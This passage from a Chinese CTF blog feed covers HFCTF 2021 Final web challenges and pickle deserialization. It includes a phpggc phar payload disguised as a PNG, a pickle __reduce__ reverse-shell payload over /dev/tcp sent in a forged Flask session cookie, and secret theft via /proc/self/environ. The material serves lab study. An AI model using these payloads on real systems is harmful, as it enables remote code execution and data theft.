class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/2021/07/28/HFCTF-2021-Final-hatenum/Snipaste_2021-07-28_17-21-48.png"></p><p><code>gh2</code>的重复导致从后往前匹配的时候，两个重复子串之前的部分会被跳过</p><p>结合上面从前往后匹配的结果</p><p>code为：<code>erghruigh2uygh23uiu32ig</code></p><p>以admin身份登录拿到flag</p><p><img src="/2021/07/28/HFCTF-2021-Final-hatenum/Snipaste_2021-07-28_17-32-50.png"></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h3&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://123-prog.github.io/categories/CTF/"/>
    
    <category term="sql注入" scheme="https://123-prog.github.io/categories/CTF/sql%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="sql注入" scheme="https://123-prog.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>(HFCTF 2021 Final)tinypng</title>
    <link href="https://123-prog.github.io/2021/07/27/HFCTF-2021-Final-tinypng/"/>
    <id>https://123-prog.github.io/2021/07/27/HFCTF-2021-Final-tinypng/</id>
    <published>2021-07-27T09:23:20.000Z</published>
    <updated>2021-09-22T10:17:45.284Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>源码分析，先看一下路由</p><a id="more"></a><p><img src="/2021/07/27/HFCTF-2021-Final-tinypng/Snipaste_2021-07-27_20-38-24.png"></p><p>与根路由<code>POST</code>方法对应的控制类是<code>IndexController</code>，与路由<code>/image</code>路由相关联的是<code>ImageController</code>控制类</p><p>分别看一下这两个控制类</p><p><code>IndexController</code></p><p><img src="/2021/07/27/HFCTF-2021-Final-tinypng/Snipaste_2021-07-27_20-49-03.png"></p><p>可以上传一个文件，后缀限定为png，对文件内容有过滤</p><p><code>preg_match(&quot;/&lt;\?|php|HALT\_COMPILER/i&quot;, $content )</code></p><p>这里大概可以猜到是phar反序列化了，过滤<code>__HALT_COMPLIER</code>可以用<code>gzip/bzip2</code>压缩数据绕过，压缩后并不会影响<code>phar://</code>的读取，但需要php有相应的扩展</p><p><code>ImageController</code></p><p><img src="/2021/07/27/HFCTF-2021-Final-tinypng/Snipaste_2021-07-27_20-49-13.png"></p><p>这里对通过GET得到的路径资源进行<code>imgcompress-&gt;compressImg</code>，跟进去看一下</p><p><img src="/2021/07/27/HFCTF-2021-Final-tinypng/Snipaste_2021-07-27_20-55-53.png"></p><p>有个<code>getimagesize()</code>，可以触发phar的反序列化</p><h3 id="0x02-利用链"><a href="#0x02-利用链" class="headerlink" title="0x02 利用链"></a>0x02 利用链</h3><p>phpggc一把梭</p><p>可以看到版本</p><p><img src="/2021/07/27/HFCTF-2021-Final-tinypng/Snipaste_2021-07-27_20-58-46.png"></p><p>用phpggc生成payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./phpggc Laravel/RCE7 readfile &#x27;/flag&#x27; --phar phar &gt; 1.phar</span><br><span class="line">gzip 1.phar</span><br><span class="line">mv 1.phar.gz 1.png</span><br></pre></td></tr></table></figure><p><img src="/2021/07/27/HFCTF-2021-Final-tinypng/Snipaste_2021-07-27_21-07-20.png"></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h3&gt;&lt;p&gt;源码分析，先看一下路由&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://123-prog.github.io/categories/CTF/"/>
    
    <category term="php反序列化" scheme="https://123-prog.github.io/categories/CTF/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="phar反序列化" scheme="https://123-prog.github.io/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>(HFCTF 2021 Final)easyflask</title>
    <link href="https://123-prog.github.io/2021/07/24/HFCTF-2021-Final-easyflask/"/>
    <id>https://123-prog.github.io/2021/07/24/HFCTF-2021-Final-easyflask/</id>
    <published>2021-07-24T15:57:00.000Z</published>
    <updated>2021-09-22T10:15:18.209Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-源码"><a href="#0x01-源码" class="headerlink" title="0x01 源码"></a>0x01 源码</h3><p><code>/file?file=/app/source</code></p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;*******&quot;</span></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;u&#x27;</span>):</span><br><span class="line">        u = pickle.dumps(User())</span><br><span class="line">        session[<span class="string">&#x27;u&#x27;</span>] = u</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/file?file=index.js&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_handler</span>():</span></span><br><span class="line">    path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&#x27;static&#x27;</span>, path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path) <span class="keyword">or</span> os.path.isdir(path) \</span><br><span class="line">            <span class="keyword">or</span> <span class="string">&#x27;.py&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;.sh&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;disallowed&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_handler</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>):</span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p><code>/admin</code>路由下看到了<code>pickle.loads()</code>，pickle反序列化</p><p><code>/file?file=/proc/self/environ</code></p><p>拿到<code>secret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh</code></p><p>下个加密脚本<a href="https://github.com/noraj/flask-session-cookie-manager/blob/master/flask_session_cookie_manager3.py">https://github.com/noraj/flask-session-cookie-manager/blob/master/flask_session_cookie_manager3.py</a></p><p>重命名<code>getSession.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> getSession</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">    <span class="string">&#x27;__reduce__&#x27;</span>: <span class="keyword">lambda</span> o: (os.system,(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span>,))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = pickle.dumps(User())</span></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;b&#x27;\\x80\\x04\\x95P\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x05posix\\x94\\x8c\\x06system\\x94\\x93\\x94\\x8c5bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;\\x94\\x85\\x94R\\x94.&#x27;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">secret_key = <span class="string">&#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27;</span></span><br><span class="line">session_stru = <span class="string">&quot;&#123;&#x27;u&#x27;:&quot;</span>+payload+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">session = getSession.FSCM.encode(secret_key,session_stru)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://e3d3f18d-c6b3-4ebe-849b-649f67498bec.node4.buuoj.cn/admin&#x27;</span></span><br><span class="line"></span><br><span class="line">cookies = &#123;<span class="string">&#x27;session&#x27;</span>:session&#125;</span><br><span class="line">r = requests.get(url, cookies=cookies)</span><br></pre></td></tr></table></figure><p>成功反弹shell，拿到flag</p><p><img src="/2021/07/24/HFCTF-2021-Final-easyflask/Snipaste_2021-07-25_00-02-04.png"></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01-源码&quot;&gt;&lt;a href=&quot;#0x01-源码&quot; class=&quot;headerlink&quot; title=&quot;0x01 源码&quot;&gt;&lt;/a&gt;0x01 源码&lt;/h3&gt;&lt;p&gt;&lt;code&gt;/file?file=/app/source&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://123-prog.github.io/categories/CTF/"/>
    
    <category term="python web" scheme="https://123-prog.github.io/categories/CTF/python-web/"/>
    
    
    <category term="flask session伪造" scheme="https://123-prog.github.io/tags/flask-session%E4%BC%AA%E9%80%A0/"/>
    
    <category term="pickle反序列化" scheme="https://123-prog.github.io/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>pickle 反序列化</title>
    <link href="https://123-prog.github.io/2021/07/24/pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://123-prog.github.io/2021/07/24/pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-07-24T10:56:09.000Z</published>
    <updated>2021-07-24T16:04:58.101Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-pickle"><a href="#0x01-pickle" class="headerlink" title="0x01 pickle"></a>0x01 pickle</h3><p>pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 <code>PVM（Pickle Virtual Machine）</code>，包含三大部分</p><a id="more"></a><blockquote><p><code>1.栈</code>：由list实现，存放临时的数据，操作，参数等等</p><p><code>2.memo</code>: 由dict实现，存放已经序列化的数据，在PVM整个生命周期内，提供存储的空间</p><p><code>3.指令处理器</code>：读取opcode和参数，解释执行，遇到<code>.</code>停止解释</p></blockquote><p>pickle协议版本很多，最容易阅读，也是最容易手写的是**<code>v0</code>**，因为pickle版本向下兼容，所以不必担心版本不兼容出错的问题</p><p>举例一个比较简单的利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> system,(<span class="string">&#x27;whoami&#x27;</span>,)</span><br><span class="line">    </span><br><span class="line">d1 = demo()</span><br><span class="line">pickle_str = pickle.dumps(d1)</span><br><span class="line">print(pickle_str)</span><br><span class="line"><span class="comment">#b&#x27;\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.&#x27;</span></span><br><span class="line"><span class="comment">#使用pickle.loads(pickle_str)就可以实现命令执行</span></span><br></pre></td></tr></table></figure><p><strong><code>object.__reduce__():</code></strong></p><p>重写类的<code>__reduce__()</code>函数，可以使类在实例化的时候按照重写的方式进行，该函数返回一个元组，元组第一个值是<code>调用的函数</code>，第二个值是<code>参数</code></p><h3 id="0x02-opcode"><a href="#0x02-opcode" class="headerlink" title="0x02 opcode"></a>0x02 opcode</h3><p>各个opcode的用法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">MARK           = <span class="string">b&#x27;(&#x27;</span>   <span class="comment"># push special markobject on stack</span></span><br><span class="line">STOP           = <span class="string">b&#x27;.&#x27;</span>   <span class="comment"># every pickle ends with STOP</span></span><br><span class="line">POP            = <span class="string">b&#x27;0&#x27;</span>   <span class="comment"># discard topmost stack item</span></span><br><span class="line">POP_MARK       = <span class="string">b&#x27;1&#x27;</span>   <span class="comment"># discard stack top through topmost markobject</span></span><br><span class="line">DUP            = <span class="string">b&#x27;2&#x27;</span>   <span class="comment"># duplicate top stack item</span></span><br><span class="line">FLOAT          = <span class="string">b&#x27;F&#x27;</span>   <span class="comment"># push float object; decimal string argument</span></span><br><span class="line">INT            = <span class="string">b&#x27;I&#x27;</span>   <span class="comment"># push integer or bool; decimal string argument</span></span><br><span class="line">BININT         = <span class="string">b&#x27;J&#x27;</span>   <span class="comment"># push four-byte signed int</span></span><br><span class="line">BININT1        = <span class="string">b&#x27;K&#x27;</span>   <span class="comment"># push 1-byte unsigned int</span></span><br><span class="line">LONG           = <span class="string">b&#x27;L&#x27;</span>   <span class="comment"># push long; decimal string argument</span></span><br><span class="line">BININT2        = <span class="string">b&#x27;M&#x27;</span>   <span class="comment"># push 2-byte unsigned int</span></span><br><span class="line">NONE           = <span class="string">b&#x27;N&#x27;</span>   <span class="comment"># push None</span></span><br><span class="line">PERSID         = <span class="string">b&#x27;P&#x27;</span>   <span class="comment"># push persistent object; id is taken from string arg</span></span><br><span class="line">BINPERSID      = <span class="string">b&#x27;Q&#x27;</span>   <span class="comment">#  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span></span><br><span class="line">REDUCE         = <span class="string">b&#x27;R&#x27;</span>   <span class="comment"># apply callable to argtuple, both on stack</span></span><br><span class="line">STRING         = <span class="string">b&#x27;S&#x27;</span>   <span class="comment"># push string; NL-terminated string argument</span></span><br><span class="line">BINSTRING      = <span class="string">b&#x27;T&#x27;</span>   <span class="comment"># push string; counted binary string argument</span></span><br><span class="line">SHORT_BINSTRING= <span class="string">b&#x27;U&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line">UNICODE        = <span class="string">b&#x27;V&#x27;</span>   <span class="comment"># push Unicode string; raw-unicode-escaped&#x27;d argument</span></span><br><span class="line">BINUNICODE     = <span class="string">b&#x27;X&#x27;</span>   <span class="comment">#   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span></span><br><span class="line">APPEND         = <span class="string">b&#x27;a&#x27;</span>   <span class="comment"># append stack top to list below it</span></span><br><span class="line">BUILD          = <span class="string">b&#x27;b&#x27;</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line">GLOBAL         = <span class="string">b&#x27;c&#x27;</span>   <span class="comment"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line">DICT           = <span class="string">b&#x27;d&#x27;</span>   <span class="comment"># build a dict from stack items</span></span><br><span class="line">EMPTY_DICT     = <span class="string">b&#x27;&#125;&#x27;</span>   <span class="comment"># push empty dict</span></span><br><span class="line">APPENDS        = <span class="string">b&#x27;e&#x27;</span>   <span class="comment"># extend list on stack by topmost stack slice</span></span><br><span class="line">GET            = <span class="string">b&#x27;g&#x27;</span>   <span class="comment"># push item from memo on stack; index is string arg</span></span><br><span class="line">BINGET         = <span class="string">b&#x27;h&#x27;</span>   <span class="comment">#   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">INST           = <span class="string">b&#x27;i&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">LONG_BINGET    = <span class="string">b&#x27;j&#x27;</span>   <span class="comment"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line">LIST           = <span class="string">b&#x27;l&#x27;</span>   <span class="comment"># build list from topmost stack items</span></span><br><span class="line">EMPTY_LIST     = <span class="string">b&#x27;]&#x27;</span>   <span class="comment"># push empty list</span></span><br><span class="line">OBJ            = <span class="string">b&#x27;o&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">PUT            = <span class="string">b&#x27;p&#x27;</span>   <span class="comment"># store stack top in memo; index is string arg</span></span><br><span class="line">BINPUT         = <span class="string">b&#x27;q&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">LONG_BINPUT    = <span class="string">b&#x27;r&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span></span><br><span class="line">SETITEM        = <span class="string">b&#x27;s&#x27;</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line">TUPLE          = <span class="string">b&#x27;t&#x27;</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line">EMPTY_TUPLE    = <span class="string">b&#x27;)&#x27;</span>   <span class="comment"># push empty tuple</span></span><br><span class="line">SETITEMS       = <span class="string">b&#x27;u&#x27;</span>   <span class="comment"># modify dict by adding topmost key+value pairs</span></span><br><span class="line">BINFLOAT       = <span class="string">b&#x27;G&#x27;</span>   <span class="comment"># push float; arg is 8-byte float encoding</span></span><br><span class="line"></span><br><span class="line">TRUE           = <span class="string">b&#x27;I01\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line">FALSE          = <span class="string">b&#x27;I00\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 2</span></span><br><span class="line"></span><br><span class="line">PROTO          = <span class="string">b&#x27;\x80&#x27;</span>  <span class="comment"># identify pickle protocol</span></span><br><span class="line">NEWOBJ         = <span class="string">b&#x27;\x81&#x27;</span>  <span class="comment"># build object by applying cls.__new__ to argtuple</span></span><br><span class="line">EXT1           = <span class="string">b&#x27;\x82&#x27;</span>  <span class="comment"># push object from extension registry; 1-byte index</span></span><br><span class="line">EXT2           = <span class="string">b&#x27;\x83&#x27;</span>  <span class="comment"># ditto, but 2-byte index</span></span><br><span class="line">EXT4           = <span class="string">b&#x27;\x84&#x27;</span>  <span class="comment"># ditto, but 4-byte index</span></span><br><span class="line">TUPLE1         = <span class="string">b&#x27;\x85&#x27;</span>  <span class="comment"># build 1-tuple from stack top</span></span><br><span class="line">TUPLE2         = <span class="string">b&#x27;\x86&#x27;</span>  <span class="comment"># build 2-tuple from two topmost stack items</span></span><br><span class="line">TUPLE3         = <span class="string">b&#x27;\x87&#x27;</span>  <span class="comment"># build 3-tuple from three topmost stack items</span></span><br><span class="line">NEWTRUE        = <span class="string">b&#x27;\x88&#x27;</span>  <span class="comment"># push True</span></span><br><span class="line">NEWFALSE       = <span class="string">b&#x27;\x89&#x27;</span>  <span class="comment"># push False</span></span><br><span class="line">LONG1          = <span class="string">b&#x27;\x8a&#x27;</span>  <span class="comment"># push long from &lt; 256 bytes</span></span><br><span class="line">LONG4          = <span class="string">b&#x27;\x8b&#x27;</span>  <span class="comment"># push really big long</span></span><br><span class="line"></span><br><span class="line">_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 3 (Python 3.x)</span></span><br><span class="line"></span><br><span class="line">BINBYTES       = <span class="string">b&#x27;B&#x27;</span>   <span class="comment"># push bytes; counted binary string argument</span></span><br><span class="line">SHORT_BINBYTES = <span class="string">b&#x27;C&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 4</span></span><br><span class="line"></span><br><span class="line">SHORT_BINUNICODE = <span class="string">b&#x27;\x8c&#x27;</span>  <span class="comment"># push short string; UTF-8 length &lt; 256 bytes</span></span><br><span class="line">BINUNICODE8      = <span class="string">b&#x27;\x8d&#x27;</span>  <span class="comment"># push very long string</span></span><br><span class="line">BINBYTES8        = <span class="string">b&#x27;\x8e&#x27;</span>  <span class="comment"># push very long bytes string</span></span><br><span class="line">EMPTY_SET        = <span class="string">b&#x27;\x8f&#x27;</span>  <span class="comment"># push empty set on the stack</span></span><br><span class="line">ADDITEMS         = <span class="string">b&#x27;\x90&#x27;</span>  <span class="comment"># modify set by adding topmost stack items</span></span><br><span class="line">FROZENSET        = <span class="string">b&#x27;\x91&#x27;</span>  <span class="comment"># build frozenset from topmost stack items</span></span><br><span class="line">NEWOBJ_EX        = <span class="string">b&#x27;\x92&#x27;</span>  <span class="comment"># like NEWOBJ but work with keyword only arguments</span></span><br><span class="line">STACK_GLOBAL     = <span class="string">b&#x27;\x93&#x27;</span>  <span class="comment"># same as GLOBAL but using names on the stacks</span></span><br><span class="line">MEMOIZE          = <span class="string">b&#x27;\x94&#x27;</span>  <span class="comment"># store top of the stack in memo</span></span><br><span class="line">FRAME            = <span class="string">b&#x27;\x95&#x27;</span>  <span class="comment"># indicate the beginning of a new frame</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 5</span></span><br><span class="line"></span><br><span class="line">BYTEARRAY8       = <span class="string">b&#x27;\x96&#x27;</span>  <span class="comment"># push bytearray</span></span><br><span class="line">NEXT_BUFFER      = <span class="string">b&#x27;\x97&#x27;</span>  <span class="comment"># push next out-of-band buffer</span></span><br><span class="line">READONLY_BUFFER  = <span class="string">b&#x27;\x98&#x27;</span>  <span class="comment"># make top of stack readonly</span></span><br></pre></td></tr></table></figure><p>几个常用的：</p><blockquote><p><code>1.b&#39;R&#39;:</code> <code>__reduce__()</code>函数对应的就是这个操作码，选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数，可以执行命令，除此之外<code>i</code>,<code>o</code>这两个opcode也是可以实现命令执行或实例化对象</p><p><code>2.b&#39;c&#39;:</code> 可以实现python中模块的引入，使用方法是<code>c[module]\n[instance]\n</code>，将获得的对象入栈</p><p><code>3.b&#39;(&#39;</code>: MARK，入栈</p><p><code>4.b&#39;)&#39;</code>: 向栈中压入一个空元组</p><p><code>5.b&#39;t&#39;</code>: 寻找上面的一个MARK，将之间内容存为tuple(元组)</p><p><code>6.b&#39;d&#39;</code>: 